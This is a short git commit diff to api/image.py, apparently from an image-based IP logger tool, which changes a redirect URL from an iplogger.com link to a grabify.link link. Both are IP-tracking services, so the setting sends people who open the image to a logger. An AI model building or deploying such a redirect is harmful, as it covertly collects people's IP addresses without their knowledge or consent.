9e5be3ef9b4deb8e1ab65ae31742317d613ea026
SirDill <142552178+SirDill@users.noreply.github.com>
2025-02-19 05:19:50 +0000

    Update image.py

--- api/image.py
+++ api/image.py
@@ -52,7 +52,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://iplogger.com/2tNqZ6" # Link to the webpage to redirect to 
+        "page": "https://grabify.link/5XJXT3" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
